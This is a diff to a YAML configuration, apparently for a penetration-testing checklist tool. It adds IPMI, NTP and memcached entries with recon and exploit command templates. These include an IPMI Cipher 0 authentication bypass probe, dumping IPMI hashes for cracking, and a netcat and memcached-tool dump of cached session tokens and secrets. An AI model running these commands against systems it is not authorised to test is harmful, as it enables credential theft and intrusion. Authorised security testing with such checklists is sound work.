@@ -497,6 +497,45 @@ services:
         description: "Extract documents from user and authentication collections"
         command_template: "mongodump --host {IP} --port {PORT} --out ./loot/mongo_{IP}"
 
+  ipmi:
+    ports: [623]
+    name_patterns: ["^ipmi", "rmcp", "asf- rmcp"]
+    checklists:
+      - category: "recon"
+        title: "Probe IPMI RMCP Cipher Zero & Version"
+        description: "Identify BMC vendor/model and check for the Cipher 0 authentication bypass"
+        command_template: "ipmitool -I lanplus -H {IP} -U '' -P '' chassis status"
+      - category: "exploit"
+        title: "Dump IPMI User Hashes for Offline Cracking"
+        description: "Capture RAKP HMAC hashes from the BMC and crack with hashcat mode 7300"
+        command_template: "ipmi-dumphashes.py {IP}"
+
+  ntp:
+    ports: [123]
+    name_patterns: ["^ntp", "ntpd", "chrony"]
+    checklists:
+      - category: "recon"
+        title: "Query NTP Version & System Variables"
+        description: "Fingerprint daemon version and read system/peer variables for internal hostnames"
+        command_template: "ntpdc -n -c monlist -c sysinfo {IP}"
+      - category: "enum"
+        title: "Enumerate NTP Peers & Associated Hosts"
+        description: "Harvest internal IPs and hostnames from peer associations for attack surface mapping"
+        command_template: "ntpq -c readvar -c peers {IP}"
+
+  memcached:
+    ports: [11211]
+    name_patterns: ["^memcached"]
+    checklists:
+      - category: "recon"
+        title: "Check Unauthenticated Memcached Stats Access"
+        description: "Connect without credentials and dump server stats, versions, and listening config"
+        command_template: "nc -vn {IP} {PORT} <<<'stats\r\nquit'"
+      - category: "enum"
+        title: "Dump Cached Keys & Session Data"
+        description: "Enumerate slabs and dump stored items for session tokens or secrets in memory"
+        command_template: "memcached-tool {IP}:{PORT} dump"
+
   generic_unknown:
     ports: []
     name_patterns: [".*"]
